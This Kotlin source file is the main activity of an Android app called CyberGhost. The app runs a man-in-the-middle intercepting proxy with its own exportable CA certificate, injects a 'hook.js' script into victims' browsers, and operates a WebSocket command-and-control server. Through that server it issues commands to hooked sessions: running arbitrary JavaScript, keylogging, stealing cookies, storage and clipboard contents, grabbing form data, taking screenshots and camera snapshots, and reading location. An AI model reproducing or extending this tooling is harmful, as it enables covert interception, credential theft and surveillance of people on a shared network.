package com.cyberghost

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.runtime.*
import androidx.lifecycle.lifecycleScope
import com.cyberghost.core.*
import com.cyberghost.ui.*
import kotlinx.coroutines.launch
import android.content.Intent
import android.net.Uri
import androidx.core.content.FileProvider
import java.io.File

class MainActivity : ComponentActivity() {

    private lateinit var certManager: CertManager
    private lateinit var deviceManager: DeviceManager
    private lateinit var contentInjector: ContentInjector
    private var proxy: InterceptProxy? = null
    private var c2Server: WebSocketC2Server? = null
    private var mediaServer: MediaServer? = null
    private var dnsCapture: DnsCapture? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        certManager = CertManager(filesDir)
        deviceManager = DeviceManager()
        contentInjector = ContentInjector()
        val hookJs = assets.open("hook.js").bufferedReader().readText()

        setContent {
            val packets = remember { mutableStateListOf<InterceptedPacket>() }
            val interceptQueue = remember { mutableStateListOf<PendingIntercept>() }
            val devices by deviceManager.deviceList.collectAsState()
            val events = remember { mutableStateListOf<C2Event>() }
            var isRunning by remember { mutableStateOf(false) }
            var mode by remember { mutableStateOf(InterceptMode.PASSTHROUGH) }
            var config by remember { mutableStateOf(InjectionConfig()) }

            LaunchedEffect(isRunning) {
                if (isRunning) {
                    proxy = InterceptProxy(8080, certManager, contentInjector).also { p ->
                        p.mode = mode; p.start()
                        launch { p.packets.collect { pkt ->
                            packets.add(pkt); if (packets.size > 2000) packets.removeAt(0)
                            deviceManager.trackRequest(pkt.sourceIp, pkt.headers["User-Agent"], pkt.body.size.toLong())
                        }}
                    }
                    mediaServer = MediaServer(9090, this@MainActivity, hookJs).also { it.start() }
                    c2Server = WebSocketC2Server(9091, deviceManager).also { c2 ->
                        c2.start()
                        launch { c2.events.collect { event -> events.add(event); if (events.size > 500) events.removeAt(0) } }
                    }
                    dnsCapture = DnsCapture(5353).also { it.start() }
                } else {
                    proxy?.stop(); proxy = null; c2Server?.stop(); c2Server = null
                    mediaServer?.stop(); mediaServer = null; dnsCapture?.stop(); dnsCapture = null
                }
            }

            LaunchedEffect(mode) { proxy?.mode = mode }
            LaunchedEffect(config) { contentInjector.config = config }

            LaunchedEffect(isRunning) {
                if (isRunning) { launch { while (true) {
                    kotlinx.coroutines.delay(200)
                    val current = proxy?.interceptQueue?.toList() ?: emptyList()
                    interceptQueue.clear(); interceptQueue.addAll(current)
                }}}
            }

            CyberGhostScreen(
                interceptQueue = interceptQueue, packets = packets, devices = devices,
                hookedSessions = deviceManager.getHookedSessions(), mode = mode,
                isRunning = isRunning, events = events,
                onModeChange = { mode = it }, onToggle = { isRunning = !isRunning },
                onForward = { id, pkt -> proxy?.forwardPacket(id, pkt) },
                onDrop = { id -> proxy?.dropPacket(id) },
                onCommand = { session, action, params ->
                    when (action) {
                        "exec_js" -> c2Server?.execJs(session, params["code"] as? String ?: "")
                        "screenshot" -> c2Server?.screenshot(session)
                        "keylog_start" -> c2Server?.startKeylog(session)
                        "keylog_stop" -> c2Server?.stopKeylog(session)
                        "get_cookies" -> c2Server?.getCookies(session)
                        "get_storage" -> c2Server?.getStorage(session)
                        "get_clipboard" -> c2Server?.getClipboard(session)
                        "get_location" -> c2Server?.getLocation(session)
                        "camera_snap" -> c2Server?.cameraSnap(session)
                        "form_grab" -> c2Server?.grabForms(session)
                        "get_dom" -> c2Server?.getDom(session)
                    }
                },
                onExportCa = { exportCa() }, onConfigUpdate = { config = it }, currentConfig = config
            )
        }
    }

    private fun exportCa() {
        val pem = certManager.getCaCertPem()
        val file = File(cacheDir, "cyberghost_ca.crt")
        file.writeText(pem)
        val uri: Uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
        startActivity(Intent.createChooser(
            Intent(Intent.ACTION_SEND).apply {
                type = "application/x-x509-ca-cert"
                putExtra(Intent.EXTRA_STREAM, uri)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }, "Export CyberGhost CA"
        ))
    }

    override fun onDestroy() {
        proxy?.stop(); c2Server?.stop(); mediaServer?.stop(); dnsCapture?.stop(); super.onDestroy()
    }
}
